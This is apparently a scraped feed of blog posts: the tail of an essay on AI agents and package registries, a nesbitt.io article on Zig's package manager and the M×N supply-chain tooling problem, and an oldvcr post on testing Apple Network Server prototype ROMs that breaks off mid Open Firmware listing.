behavior the author never thought to specify. It\u2019s emergent correctness from years of bug reports. Someone hit a weird proxy configuration in 2019 and filed an issue. Someone else found a race condition under high concurrency in 2021. A third person noticed that a particular header combination broke on older TLS stacks. Each of those fixes is now baked into the library. You can\u2019t prompt your way into a decade of production bug reports. \\n\\n Who governs the prompts \\n\\n Package registries aren\u2019t just file hosts. They decide who owns names, how disputes resolve, what gets removed, and how compromised accounts are handled. They\u2019re governance providers , making judgment calls that keep ecosystems healthy: removing malware, transferring abandoned packages, enforcing naming policies. When npm restored left-pad after Azer Ko\u00e7ulu unpublished it, that was a governance decision that kept thousands of builds from breaking. A prompt registry has none of this. Who decides that a prompt is malicious? Who resolves conflicts when two prompt authors claim the same specification name? Who steps in when a widely-used prompt starts producing vulnerable code? These are governance questions, and they need institutions to answer them. \\n\\n Yes, we\u2019ve automated a lot of this collaboration, maybe too much if you\u2019ve ever looked inside a node_modules folder. But underneath the automation there\u2019s still a core human process: people building on each other\u2019s work without needing to talk to each other, and that kind of coordination can\u2019t be specified in a prompt. \\n\\n AI agents aren\u2019t going to stop using packages. Packages feature heavily in the training data, and every coding agent already reaches for npm install or pip install as a first instinct. The interesting work is happening in the opposite direction: making agents better at working with package managers rather than replacing them. I\u2019ve been building a skill that makes coding agents evaluate packages skeptically before suggesting them, checking that they exist, that they\u2019re maintained, that the standard library doesn\u2019t already cover the use case. There\u2019s also a broader opportunity to give agents a shared protocol for package management , a common vocabulary for resolution, publishing and governance that works across ecosystems. Package management is a wicked problem , and AI that understands package managers deeply seems more useful than AI that tries to make them disappear. '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:56:41</p>"},{"location":"nesbitt.io/Zig%20and%20the%20M%C3%97N%20Supply%20Chain%20Problem_20260129/","title":"Zig and the M\u00d7N Supply Chain Problem","text":"<p>\u6765\u6e90: nesbitt.io \u53d1\u5e03\u65f6\u95f4: 2026-01-29T10:00:00+00:00 \u94fe\u63a5: https://nesbitt.io/2026/01/29/zig-and-the-mxn-supply-chain-problem.html</p> <p>{'type': 'text/html', 'language': None, 'base': 'https://nesbitt.io/2026/01/29/zig-and-the-mxn-supply-chain-problem.html', 'value': ' Zig shipped a built-in package manager in version 0.11 in August 2023. It uses build.zig.zon files for manifests and fetches dependencies directly from URLs, usually tarballs on GitHub. There\u2019s no central registry yet, though the community runs unofficial indexes like zpm and aquila . 1 \\n\\n The package manager works well enough for declaring dependencies, fetching them, and building against them. The hard part is everything else: the ecosystem of tools, services, and infrastructure that makes a package manager usable in production. \\n\\n The package management landscape spans dozens of categories and hundreds of tools. For Zig to have the same tooling support as npm or Cargo, each of those tools either needs to add Zig support, or the Zig community needs to build alternatives. \\n\\n What the community has to build \\n\\n Some things only the Zig community can do. Nobody else will write the build.zig.zon parser. Nobody else knows the resolution semantics. These are the parts that require language expertise: \\n\\n Manifest and lockfile parsing. Tools like bibliothecary , syft , and osv-scalibr parse dependency files across ecosystems. Each needs a Zig parser added. Right now, none of them support build.zig.zon . \\n\\n Vulnerability scanning. pip-audit , bundler-audit , and cargo-audit are language-specific tools that check dependencies against advisory databases. Zig needs a zig-audit equivalent, plus an advisory database to check against. \\n\\n SBOM generation. cdxgen and syft generate SBOMs from project files. They need to understand Zig\u2019s dependency format to include Zig packages in the bill of materials. \\n\\n Dependency tree visualization. Cargo has cargo tree , npm has npm ls . Zig needs something equivalent to show the resolved dependency graph. \\n\\n Registry software. If Zig wants a central registry, someone has to build and run it. Crates.io, RubyGems.org, PyPI all required significant engineering effort. The unofficial indexes exist but aren\u2019t authoritative. \\n\\n PURL and VERS types. The Package URL spec and version range spec are standards, but they\u2019re essentially maps of existing ecosystems rather than higher-order abstractions. Each new package manager has to propose a type, document its semantics, and get the PR merged. Zig doesn\u2019t have a PURL type yet, so Zig packages can\u2019t be referenced in SBOMs, advisory databases, or cross-ecosystem tooling in a standardized way. \\n\\n What vendors need to care about \\n\\n Other integrations require buy-in from companies who may not care about Zig yet. Market share matters here. If you\u2019re a SaaS vendor prioritizing what to support next, Zig is competing against languages with larger user bases. Even if the Zig community does everything right, they\u2019re still waiting on Dependabot, Renovate, and Snyk to care. You can\u2019t get adoption without tooling, and you can\u2019t get tooling without adoption. \\n\\n Dependency update tools. Dependabot supports a fixed set of ecosystems. Adding a new one requires GitHub engineering time. Renovate is more extensible but still needs a manager plugin , and neither supports Zig yet. There\u2019s a Dependabot issue and a Renovate discussion , both from 2023, both stalled. \\n\\n Vulnerability databases. The GitHub Advisory Database , OSV , CVE.org (MITRE), and the NVD all need to recognize Zig packages and file advisories against them using Zig\u2019s identifier scheme. That requires agreeing on how to identify Zig packages, but there\u2019s no PURL type for Zig yet. \\n\\n SCA tools. Snyk , Socket , Sonatype , and others would need to add Zig support. Each vendor makes independent decisions about what\u2019s worth supporting. \\n\\n Enterprise artifact repositories. JFrog Artifactory and Sonatype Nexus support proxying and hosting packages for many ecosystems, but Zig isn\u2019t among them. \\n\\n Metadata platforms. deps.dev , Libraries.io , and ecosyste.ms aggregate package data across ecosystems. Each needs to understand Zig\u2019s package format and index Zig packages from wherever they\u2019re published. \\n\\n Forge integrations. GitHub\u2019s dependency graph, GitLab\u2019s dependency scanning, and Gitea\u2019s security features all need to parse Zig manifests to show Zig dependencies in their UIs. \\n\\n What else needs updating \\n\\n SBOM formats. CycloneDX and SPDX have ecosystem-specific guidance. Zig needs representation in both. \\n\\n Trusted publishing. PyPI\u2019s Trusted Publishers and npm\u2019s provenance rely on Sigstore and registry-specific OIDC flows. If Zig gets a central registry, it needs this infrastructure too. \\n\\n How this usually goes \\n\\n The typical path looks like this: \\n\\n \\n Package manager ships with the language \\n Early adopters manage dependencies manually \\n Community builds minimal tooling (a parser here, an index there) \\n Language gains traction, vendors start noticing \\n Major tools add support one by one, in no particular order \\n Eventually, enough coverage exists that the ecosystem feels complete \\n \\n\\n This process takes years. Go modules shipped in 2018 and still lacks full tooling parity with older ecosystems. Rust has been around since 2015 and Cargo is well-supported now, but that\u2019s a decade of incremental integration. \\n\\n Somewhere along the way, package manager designers realize that some of their early decisions make integration harder. Maybe they didn\u2019t assign unique identifiers to packages. Maybe their version scheme doesn\u2019t map cleanly to PURL. Maybe they fetch dependencies from URLs instead of a registry, which breaks assumptions baked into every SBOM tool. By then, users depend on the current behavior. Changing a package manager after launch is like changing the hull of a submarine while it\u2019s searching for the Titanic. \\n\\n Each new package manager goes through the same loop. Each tool vendor reimplements the same patterns: parse a manifest, extract dependencies, check against advisories. The work is duplicated dozens of times across the ecosystem, with each implementation making slightly different decisions about edge cases. \\n\\n Beyond the engineering, there\u2019s human coordination. Shepherding PRs through repos maintained by volunteers with different priorities. Getting PURL proposals reviewed by a committee that meets sporadically. Convincing SCA vendors to prioritize your ecosystem over the next one in line. It\u2019s part of why package management is a wicked problem : too many stakeholders, no single authority, solutions that create new problems. \\n\\n What would make this easier \\n\\n Package management is in its pre-LSP era. Before the Language Server Protocol , every IDE had to implement support for every language: M editors \u00d7 N languages = M\u00d7N integrations. LSP changed that to M+N. Each editor implements the protocol once, each language implements a server once, and they all work together. \\n\\n Package management has the same M\u00d7N problem. Every tool (Dependabot, Snyk, Syft, deps.dev) implements support for every ecosystem (npm, PyPI, Cargo, Go) separately, each integration custom, and when Zig arrives it goes to the back of every queue. \\n\\n Every codebase is a dependency graph. The syntax varies, the resolution algorithms differ, the registries have different APIs, but the structure is the same: nodes are packages, edges are version constraints, and the goal is a consistent set of concrete versions. Zig\u2019s graph looks like Cargo\u2019s graph looks like npm\u2019s graph, once you strip away the surface differences. \\n\\n We need a Dependency Lifecycle Protocol (DLP), an LSP for the package management world. In A Protocol for Package Management , I sketched what this might look like: common definitions for manifest structure, resolution behavior, registry APIs. If it existed, a new package manager could implement against it. Tools that speak the protocol would get Zig support without each SCA vendor adding it separately. \\n\\n The same problem twice \\n\\n The dependency layer in digital sovereignty makes a similar point from a different angle: dependencies are a chokepoint that nation-states and institutions don\u2019t control. The Zig problem and the sovereignty problem are the same problem. One is \u201cwhy can\u2019t a new language ecosystem bootstrap quickly\u201d and the other is \u201cwhy can\u2019t institutions control their own dependency infrastructure.\u201d Both point to missing abstraction layers that would allow substitution. \\n\\n The lack of a protocol creates lock-in by default, through gravity more than malice. If you\u2019re Zig, you need Dependabot and Snyk and GitHub\u2019s dependency graph. If you\u2019re a European institution, you need those same tools because that\u2019s where the vulnerability data lives. A protocol would make the dependency layer contestable: run your own registry that federates with others, stand up a regional vulnerability database that speaks the same language, use tooling that isn\u2019t controlled by three American companies. \\n\\n Governments already mandate standards for procurement: accessibility, security certifications, data residency. If US federal or EU procurement required dependency tooling that implements a common protocol, the incentive structure inverts. Government procurement is a massive market that moves in blocks. If you can\u2019t sell to governments without protocol compliance, every vendor finds budget for it overnight. Zig gets support as a side effect: if Snyk implements the protocol to keep selling to governments, Zig gets coverage by conforming to the same spec. \\n\\n The Cyber Resilience Act is already pushing in this direction with SBOM requirements. PURL, OSV, and CycloneDX are attempts at standards, but they document what exists rather than defining what should exist. The CRA mandates outputs without mandating the interoperability layer that would make those outputs meaningful across ecosystems. \\n\\n Right now, the cost of launching a new package manager includes rebuilding the entire surrounding infrastructure. Languages stick with existing tools even when they\u2019re not a great fit, because the integration burden is too high. Zig is going through this now, and Rue , a research language exploring memory safety with a gentler learning curve than Rust, doesn\u2019t have a package manager yet. When it does, it will face the same integration slog, as will every new language until the protocol layer exists. \\n \\n \\n \\n This is similar to how Go modules launched, fetching directly from version control hosts. Go eventually added proxy.golang.org and sum.golang.org to provide caching, checksums, and availability guarantees.\\xa0 \u21a9 \\n \\n \\n '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:56:42</p>"},{"location":"oldvcr.blogspot.com/","title":"oldvcr.blogspot.com\\n\\n\u7f51\u7ad9: https://oldvcr.blogspot.com\\nRSS: https://oldvcr.blogspot.com/feeds/posts/default\\n\\n---\\n\\n## \u6700\u65b0\u6587\u7ae0\\n\\n- Hands-on with two Apple Network Server prototype ROMs_20260205\\n- Stewart Cheifet has died_20260205\\n- A Christmas 2007 video present from Old VCR with Jack Tramiel et al_20260205\\n- The Texas Instruments CC-40 invades Gopherspace (plus TI-74 BASICALC)_20260205\\n- Oblast- a better Blasto game for the Commodore 64_20260205\\n","text":""},{"location":"oldvcr.blogspot.com/A%20Christmas%202007%20video%20present%20from%20Old%20VCR%20with%20Jack%20Tramiel%20et%20al_20260205/","title":"A Christmas 2007 video present from Old VCR with Jack Tramiel et al\\n\\n\u6765\u6e90: https://oldvcr.blogspot.com\\n\u94fe\u63a5: https://oldvcr.blogspot.com/2025/12/a-christmas-2007-video-present-from-old.html\\n\u65e5\u671f: 2025-12-24T15:50:00.000-08:00\\n\\n---\\n\\nA very happy holiday season and Merry Christmas to those of you who celebrate it (timezone may vary). Also, I don't think I nearly say thanks enough to my regular patrons through Ko-fi, and I want to also thank them on behalf of the geriatric systems their generosity \u2014 and all of you who have chipped in at one time or another \u2014 helps keep running. I've got more projects to finish in 2026 and I hope you enjoy them.\\nAnyway, here's a gift for\\nyou\\nwhich I forgot I still had kicking around. This is a raw cut from the 2007 Computer History Museum 25th anniversary symposium of the Commodore 64, with Jack Tramiel himself, plus Steve Wozniak, William Lowe and others (like Lee Felsenstein and Al Alcorn from the audience). I was fortunate enough to get into what was a sell-out standing-room only crowd with my trusty JVC DV camera and tape the whole thing, then dash back to So Cal and quickly dump and title it on the Power Mac Quad G5. Any camera glitches, plus a couple dropouts where I had to quickly change DV tapes, and bad titles are of course totally my fault. (In fact, there are indeed at least two errors. Can you find them?) This video is so old that it was actually originally uploaded to Google Video \u2014 some of you may remember it \u2014 and had been quietly transferred automatically to YouTube, which I had forgotten even happened. So here it is in its original strictly standard definition format. If you want to use clips from it in your own video, please give me a holler first in the comments. Enjoy.","text":""},{"location":"oldvcr.blogspot.com/Hands-on%20with%20two%20Apple%20Network%20Server%20prototype%20ROMs_20260205/","title":"Hands-on with two Apple Network Server prototype ROMs\\n\\n\u6765\u6e90: https://oldvcr.blogspot.com\\n\u94fe\u63a5: https://oldvcr.blogspot.com/2026/01/hands-on-with-two-apple-network-server.html\\n\u65e5\u671f: 2026-01-25T00:03:00.000-08:00\\n\\n---\\n\\nGrateful acknowledgement made to the several former Apple employees who materially contributed to this entry. This article wouldn't have been possible without you!\\nHere's why I need to do inventory more often.\\nThis is an Apple prototype ROM I am ashamed to admit I found in my own box of junk from various Apple Network Server parts someone at Apple Austin sent me in 2003. The 1996 Apple Network Server is one of Apple's more noteworthy white elephants and, to date, the last non-Macintosh computer (iOS devices notwithstanding) to come from Cupertino. Best known for being about the size of a generous dorm fridge and officially only running AIX 4.1, IBM's proprietary Unix for Power ISA,\\nits complicated history\\nis a microcosm of some of Apple's strangest days during the mid-1990s. At $10,000+ a pop (in 2026 dollars over $20,700), not counting the AIX license, they sold poorly and were among the first products on the chopping block when Steve Jobs returned in 1997.\\nstockholm\\n, my own Apple Network Server 500, was a castoff I got in 1998 \u2014 practically new \u2014 when the University bookstore's vendor wouldn't support the hardware and it got surplused. It was the first Unix server I ever owned personally, over the years I ended up installing nearly every available upgrade, and it ran Floodgap.com just about nonstop until I replaced it with a POWER6 in 2012 (for which it still functions as an emergency reserve). Plus, as the University was still running RS/6000 systems back then, I had ready access to tons of AIX software which the ANS ran flawlessly. It remains one of the jewels of my collection.\\nSo when\\nthe mythical ANS MacOS ROM finally surfaced\\n, I was\\nvery\\ninterested. There had always been interest in getting the ANS to run MacOS back in the day (I remember wasting an afternoon trying with a Mac OS 8 CD) and it was a poorly-kept secret that at various points in its development it could, given its hardware basis as a heavily modified Power Macintosh 9500. Apple itself perceived this interest, even demonstrating it with Mac OS prior to its release, and leading then-CTO Ellen Hancock to later announce that the ANS would get ROM upgrades to allow it to run both regular Mac OS and, in a shock to the industry, Windows NT. This would have made the ANS the first and only Apple machine ever sold to support it.\\nWell, guess what. This is\\nthat\\npre-production ROM Apple originally used to demonstrate Mac OS, and another individual has stepped up with the NT ROMs which are also now in my possession. However, at that time it wasn't clear what the prototype ROM stick was \u2014 just a whole bunch of flash chips on a Power Mac ROM DIMM which my Apple contacts tell me was used to develop many other machines at the time \u2014 and there was no way I was sticking it into my beloved production 500. But we have a solution for that. Network Servers came in three sizes: the rackmount ANS 300 (\"Deep Dish\") which was never released except for a small number of prototypes, the baseline ANS 500 (\"Shiner LE\"), and the highest tier ANS 700 (\"Shiner HE\") which added more drive bays and redundant, hot-swappable power supplies.\\nWhich brings us to\\nthis\\nmachine.\\nMeet\\nholmstock\\n, my Network Server 700, and the second ANS in my collection (the third is my non-functional\\nShiner ESB prototype\\n). This was a ship of Theseus that my friend CB and I assembled out of two partially working but rather thrashed 700s we got for \"come and get them\" in August 2003. It served as\\nstockholm\\n's body double for a number of years until\\nstockholm\\nwas retired and\\nholmstock\\nwent into cold storage as a holding bay for spare parts. This makes it the perfect system to try a dodgy ROM in.\\nI'll give you a spoiler now: it turns out the NT ROM isn't enough to install Windows NT by itself, even though it has some interesting attributes. Sadly this was not unexpected. But the pre-production ROM does work to boot Mac OS, albeit with apparent bugs and an injection of extra hardware. Let's get the 700 running again (call it a Refurb Weekend) and show the process.\\nThe 700 weighs around 85 pounds unloaded and is exactly like trying to cram a refrigerator into the backseat of your car (in this case my Honda Civic Si). While it does have wheels on the bottom, even the good ones don't have a great turning radius (and these aren't good), and getting it in and out of the car unavoidably means having to pick it up. Lift with your knees, not with your back.\\nPreparing the 700 for testing\\nThis section is basically a cloaked Refurb Weekend, but even if you're familiar with ANS guts, I'm going to point out a few specific things relevant to ROM support as we go along. We want this machine as ship-shape as we can get it so that accurate observations can be made for posterity!\\nI would also like to thank my wife who chose to politely ignore the new noisy beast hulking in the living room for a few days.\\nContinuing in the fridge motif, the 500 and 700 have a front keylock controlling a sliding door, along with a unique 4-line LCD which displays boot information and can be used as an output device in AIX and other operating systems. Unlike my very minimally yellowed 500 which has spent most of its life in quiet smoke-free server rooms, this one seemed to have gotten a bit more sun. Fortunately most of the chassis is painted metal which is also where most of the weight comes from. The keylock position on power-up is noted by the firmware; the leftmost is the service setting, the middle is a normal boot, and the rightmost (locked) position puts the machine into a power failsafe mode.\\nThe sliding door covers seven front drive bays, normally one with a CD-ROM, one with some sort of tape drive (typically a DAT/DDS drive, but a few have 8mm tape instead, both the same drives as sold for the Workgroup Server 95 and 9150), and the rest various hard drives which can be either independent or connected into an optional RAID. The 700 can take two more drives in a rear bracket. Although I have the RAID card, I never ended up installing it since a single drive was more than sufficient for what I was using it for. As most of the drive trays and both drive brackets had been removed from the two donor 700s used to assemble\\nholmstock\\n, I ended up just keeping a CD-ROM and two trays, and used the other open space for storage.\\nAt the top are the NMI, reset and power buttons, plus a standard Mac floppy drive.\\nIt is worth noting here that the internal bays are all serviced by two Symbios Logic 53C825A controllers, providing two Fast Wide SCSI busses running at 20MB/s. Unlike the typical Power Mac MESH (10MB/s) controller, the ANS internal SCSI controllers are unique to the ANS and appear in no other Apple product. Remember this for later. A second external SCSI bus is available on the rear, using the same (slower 5MB/s) CURIO SCSI/Ethernet/serial combo chip as other contemporary Power Macs and implementing an NCR 53C94.\\nThe rear (with the monitor power cable photobombing the shot) is much less yellowed. Ports are here for audio in and out (standard\\nAWACS\\n), ADB, two beige Mac MiniDIN-8 serial ports, VGA (oddly but happily a conventional HDI-15, not Apple's traditional DA-15), AAUI 10Mbit Ethernet (any AAUI Mac dongle will work), and the external SCSI bus DB-25. Six PCI slots are available. A second keylock secures the logic board which is on a slide-out drawer accessed with the two handles. Both rear panels have their own fans which are hot-swappable as well. Apple included a monitor dongle in the box.\\nIt is also worth noting here that the onboard video is a Cirrus Logic 54M30, also unique to the ANS, and likewise also used in no other Apple product. We'll be coming back to this point too.\\nParenthetically, here are the keylocks (new replacements in my part box). They are wafer-lock keys of the same type used in the Quadra 950, Apple Workgroup Server 95 and Workgroup Server 9150. As sold Network Servers came with three keys, one front, one back and one spare, but they are all interchangeable. These keys have a small three-digit code engraved into the metal identifying the lock they are designed to fit.\\nI also got out a lot of parts from storage just in case they were needed, some of which were in the 700 and some of which were separate. Besides my two boxes of tricks, I also pulled out a spare logic board, five boxes of RAM upgrade kits (these are only 16MB each, though, so this isn't as much memory as you'd think), a 200MHz CPU upgrade kit, several more loose CPUs I also have, and a RAID card just for fun.\\nI dimly recalled the machine may not have been working right when I committed it to storage, but we'll proceed as if it had been, starting with a visual inspection of the electronics.\\nThe keylock on the logic board drawer (shown here with the rear panel off so you can see how it operates) has just two positions. In the horizontal locked position, the board is connected to power and a metal tab prevents the drawer from coming out. In the vertical unlocked position, the board is disconnected and the tab is moved away from the chassis so the drawer can be pulled free. We turn the rear key, grab the handles and pull the board drawer out.\\nThis is the logic board (the spare in the bag). It has a broadly similar layout to other six-slot Power Macs and has many of the same chips, including a Grand Central (labeled I/O CNTRL, near the Cirrus Logic video ASIC), CURIO (labeled SCSI/ENET) and two Bandits (labeled as PCI BRIDGEs). However, it only has eight RAM DIMM slots instead of the 9500's twelve, and most of the system connections are consolidated into a single card edge at the top and a large power connector at the bottom. There are separate slots for the ROM DIMM, the CPU daughtercard and the L2 cache. Headers handle both internal SCSI busses, the mainboard fan and the rear keylock. A small red CUDA reset button is at the top left.\\nInstalled, the board sits in front of the mainboard fan which is primarily used to cool the CPU daughtercard. This daughtercard rides in plastic rails that serve as alignment guides and structural support. Tabs and a couple mounting screws hold the logic board in place in the drawer. The tabs, card rails and much of the drawer itself are unfortunately made from Amelioplastic, but this drawer is thick and not normally exposed to the exterior, and it mercifully remains in good physical condition. Note that when the drawer is open, the board is completely ungrounded, so only handle it with antistatic precautions.\\nI never store machines with their PRAM batteries installed (especially since my Shiner ESB prototype had been ruined by the previous owner doing so, during which time it leaked and corroded the logic board), but in this particular case since we will be messing with the system it is easier to reset the logic board if we never install the battery at all. With the machine unplugged, the battery out and the rear key unlocked (horizontal), the board will be completely depowered and will reset in about three minutes or so.\\nThe CPU card is much larger than the ones used in most other PCI Power Macs and was intended to accommodate a dual-processor SMP option which was never sold, though again some prototypes have escaped (I would love to get one). Unfortunately this means that Power Mac CPU cards can't upgrade an ANS and the highest-speed option is the 200MHz 604e card shown here, but any ANS CPU card will work in any ANS, so\\nstockholm\\nalso has a 200MHz card. Bus speed and CPU speed are related: the 132MHz (base 500) and 176MHz 604 cards run the bus at 44MHz, but the 150MHz 604 (base 700) and 200MHz 604e cards run the bus at 50MHz.\\nAt the top is the 700's standard 1MB L2 cache (the 500 came with 512K). These are allegedly regular Power Mac caches, and a Network Server 1MB cache should work in other Power Macs, but the 500 kernel-panicked with a Sonnet L2 cache upgrade and I eventually had to chase down a 1MB card pulled from another 700.\\nBehind that is the ROM stick and the centrepiece of this article. They are not always labeled \u2014 one of my spares isn't \u2014 but when they are, the standard production ROM is part 341-0833. It is a regular 4MB ROM like other Old World Macs. We're going to test this machine with that before we go installing the others.\\nTo get a test report will require a minimum amount of RAM. The ANS uses the same 168-pin DIMMs as other Power Macs and can accept up to 512MB (anything greater is not supported by the memory controller), but uniquely needs 60ns\\nparity\\nRAM for highest performance. If\\nany\\nDIMM is not parity, then the system ROM disables parity for\\nall\\nDIMMs\\nand\\nsets the timing to 70ns, even if the RAM is faster. This is a non-trivial hit, especially at the fastest 50MHz bus speed, so you really want parity if you can get it. Here I'm using parity FPM, which was sold standard in the units (all units came with at least 32MB in two 16MB DIMMs) and in upgrade kits (16MB in two 8MB DIMMs), all manufactured by IBM as OEM under contract and sold at typically exorbitant Apple prices.\\nLater on 64MB and 128MB parity DIMMs became available and\\nstockholm\\nhas a full 512MB from eight 64MB parity sticks. RAM need not be installed in pairs, though this is preferred as the ANS supports interleaving. While EDO RAM should \"just work\" (treated as FPM), I've never tried parity EDO in an ANS. We'll put in two IBM 16MB parity FPM DIMMs to equal the base 32MB.\\nWith the drawer closed and the rear key locked, we plug in the server (no drives attached yet), turn the front key to service, and then press the front power button to get ... a mostly blank front LCD instead of startup messages.\\nHaving worked with these beasts for decades, this appearance \u2014 a backlit LCD with a mostly blank or dark block display \u2014 almost certainly indicates a problem with the processor card, because enough of the logic board is working to power on the front panel but the CPU isn't running. Typically this is because the processor wormed itself out of the board and needs to be reseated, but you can also get something like this if the card went bad, and less commonly if the ROM stick isn't installed correctly.\\nHowever (moving the monitor cord out of the way), we have a problem: we can't get the drawer to open wide enough to pull out and reseat the CPU card. We'll have to take the drawer off.\\nAs usual, removing the drawer is relatively easy (it's getting it back on that's the trick). Two plastic latches on the underside of the drawer, fortunately still also in good nick, slip into two gaps in the metal slide rails. Supporting the drawer with your other hand so it doesn't fall off, push each latch in and push back the rail to disengage it.\\nThe drawer then lifts off and can be put aside, preferably onto an antistatic mat.\\nHere's the inside, where the logic board connects. The powerplane connector is at the bottom. The board at the top is the right half of the mezzanine (codenamed \"HENDY\"), with the slot for the logic board's card edge and a connector for the front panel.\\nThe mezz is a \"horseshoe\" that straddles both sides, better shown here with the top off. The other side has connectors for the NMI and reset buttons, floppy drive and SCSI busses.\\nThose bus connectors come from the SCSI backplane on the other side, here with that panel off (which can now be removed because the drawer is out). Both the front (and in the 700, the rear) drive connectors hook up here. I'd forgotten I'd disconnected bus 1 when I stored it, so I later reconnected the cable to J11 before closing this back up. If you don't do this, besides drives not working, you may get spurious errors warning that the drive fan failed or is not present (see later on).\\nThe problem with the sliding rails turned out to be two-fold, first some stuck broken pieces of plastic which I removed, and second whatever lubricant Apple had used which over the decades had desiccated into gluey, copper-coloured gunk. I cleaned off most of the ick and then used WD-40 white lithium (not regular WD-40) on the rails and worked it back and forth into the bearings. If it's good enough for your garage door opener, it's good enough for your unusual Apple server.\\nAfter about ten minutes of spraying and sliding, both rails now move smoothly and reach their maximum extents. I was very careful to wipe off any excess so there wouldn't be a mess later.\\nNow to remount the drawer. This is not well-explained in the official Apple service manual, so I'll be more explicit here. On each slide are two small metal hooks. If you don't see the hooks, pull the slides forward until you do.\\nOn each slide, one of the hooks goes into a metal notch on the two metal rails mounted on the back of the drawer. On the top slide, the bottom hook engages; on the bottom slide, the top one does.\\nOnce you've done that, then while using one hand to support the drawer, pull each slide forward until it engages with each of the black latches (it will click into position).\\nNow we can pull the drawer all the way out, pull out the 200MHz card and try to reseat it using the card guides. You shouldn't need to force it in, though it does need a bit of grunt to ensure both rows of contacts get into the slot.\\nClosing the drawer likewise doesn't require force\\nper se\\n, but the rear keylock will not turn unless you have the board fully engaged with the mezz and powerplane. There are thumbscrews but they don't really make much difference for this. Sometimes you have to slam it in a couple times, making sure the thumbscrews are completely loosened and out so that they don't get in the way. When the logic board is properly engaged and the drawer is fully closed, it should be easy to turn the rear key.\\nUnfortunately reseating the processor card didn't fix it, so the next step is to try a different one.\\nI'm saving the other 200MHz card as a spare for\\nstockholm\\n, but we have several 150MHz cards, so I selected one of those.\\nAnd it starts up! We have messages on the LCD showing the 150MHz 604 (with 50MHz bus), 32MB of parity RAM and 1MB of L2 cache were all properly detected. The reported ROM version of 1.1.22 is consistent with production ROMs as shipped. If you connect to Port 2 on the rear at 9600bps during POST, you may see additional messages.\\nSince the front key is in the service position, it goes into a service boot, first trying the CD (looking for a bootloader) and then looking for the file\\ndiags\\non a floppy disk. We have provided the machine with neither, and nothing else is available, so the server drops to an Open Firmware prompt.\\nOpen Firmware is the boot environment for all Power Macs starting with the first beige PCI systems. Originating at Sun as OpenBoot, Open Firmware provides an interactive Forth interpreter, which is used for interpreting cross-platform FCode (bytecode) in device ROMs but can also be used for development, and makes available a built-in means of managing and storing settings for installed hardware. In Macs of this generation it was generally invisible to the user except if specifically enabled or requested \u2014 remember this for later as well \u2014 and the Apple Network Server was the earliest Power Mac (well, derived, anyway) system where Open Firmware was explicitly user-facing. Open Firmware survives today largely in the form of\\nOpenBIOS\\n.\\nThe\\ndiags\\nfile in question could be theorically any XCOFF binary, but it's specifically looking for this, the Network Server Diagnostic Utility. This came on a floppy disk in the ANS accessory pack. We'll use the NSDU to check the rest of our configuration.\\nWe could reboot the server, but we can just start it from the Open Firmware prompt directly with\\nboot fd:diags\\n. You can also see some of the system's current Open Firmware environment variables; we'll have much more to say about those when we finally get to experimenting with the ROMs. Sorry about the screen photographs but the default refresh rate does not agree with my VGA capture box.\\nThe NSDU is also a single XCOFF binary. When it starts up it prints a summary of installed hardware and the results from initial POST. It has detected all RAM is parity, detected the CPU speed and internal L1, detected the external L2, detected both power supplies, and correctly shows installed RAM, no PCI cards, and most of the sensors. The only one that's wrong is the Drive Fan reads \"Off\" but that's because I hadn't remembered to reconnect the disconnected SCSI bus cable to the backplane. We'll now run the complete system test (option 3).\\nThe tests scroll up on the screen, here showing the two internal SCSI controllers and the LCD. The video chip also gets exercised for conformance with various test displays.\\nIn the end, we have a clean bill of health, both on the screen ...\\n... and on the LCD. There's one more thing left to do to certify operation: a test boot of AIX from the CD.\\nANS AIX, codenamed Harpoon, is specific to the Apple Network Server \u2014 you can't use a regular AIX CD, and installing Base Operating System packages from such a CD is likely to corrupt your install (don't ask me how I know this). Most systems shipped with this CD in the accessory pack, version 4.1.4.1. 4.1.2 was used on preproduction servers but I've never seen it myself. Apple later issued version 4.1.5, which fixed many bugs and is strongly recommended.\\nBooting from the CD.\\nThe LCD is live during an AIX boot, showing the march of AIX bootloader codes. They are the same codes as most IBM servers of this era.\\nFinally, the AIX kernel comes up, asking to define the system console. This proves our hardware (and CD-ROM) both work and that its native AIX can start, which means any weird behaviour after this point is more likely than not due to what we're testing.\\nWe're finally ready to begin. Let's enumerate the currently known Network Server ROMs. In these pre-Open Firmware 3 ROMs, the ROM version and the Open Firmware version are the same. For comparison purposes, PCI Power Macs of this era were typically 1.0.5.\\nPre-production ROMs. Currently one version is known, 1.1.20.1. These were used to boot Mac OS and AIX (and possibly another operating system I'll mention), but the internal video and SCSI controllers are not supported in Mac OS. This was the version that turned out to be on my flash DIMM.\\nProduction ROMs. Currently one version is known, 1.1.22. These only boot AIX, though systems with these ROMs can also boot NetBSD and certain Linux distributions. I won't talk further about that in this article, but if I were to use a non-AIX operating system on a production ANS, it would almost certainly be NetBSD even though it doesn't currently support internal video or the on-board Ethernet.\\nPrototype Mac OS ROMs. Currently one version is known, 2.0. These contain ROM drivers for the internal video and SCSI controllers, and are the only known ROMs to fully support all internal devices in Mac OS. This is not currently in my possession \u2014 though I'd love to get one! \u2014 but at least one person has created replica ROMs from a dump graciously made available by their owner, and then used them to successfully boot their own machine.\\nPrototype Windows NT ROMs. These ROMs also appear to be required for multiprocessor support. Currently three versions are known, 2.26b6, 2.26b8 (not dumped, referred to on the LinuxPPC-ANS list) and 2.26NT, with relatively small changes between them.\\nThese ROMs differ primarily in what operating systems they will boot (and, underlyingly, features they add or remove) and devices they contain internal support for. Those differences can be glimpsed by looking at the Forth words the ROM defines and the packages (implemented as pseudo-devices) they carry. For example, here are the packages and devices in this 700 with the production 1.1.22 ROM. The exact addresses are irrelevant for our purposes here except for the addresses of the Bandit PCI bridges, the Hammerhead memory controller and the Toolbox ROM, which are fixed.\\ndisk2:aix","text":"<p>Device isn't there! can't OPEN: /bandit/53c825@11/sd@2,0:aixOpenFirmware1.1.22 To continue booting from the default boot device type: BOOT  ok 0 &gt; dev /  ok 0 &gt; ls  004308E0: /PowerPC,604@0 00430B90:   /l2-cache@0,0 004313F0: /chosen@0 00431520: /memory@0 00431668: /openprom@0 00431728: /AAPL,ROM@FFC00000 00431968: /options@0 00431E40: /aliases@0 00432080: /packages@0 00432108:   /deblocker@0,0 004329A8:   /disk-label@0,0 00432F18:   /obp-tftp@0,0 00435B28:   /mac-files@0,0 00436410:   /mac-parts@0,0 00436D30:   /aix-boot@0,0 00437488:   /fat-files@0,0 00438DF0:   /iso-9660-files@0,0 004398E0:   /xcoff-loader@0,0 0043A410:   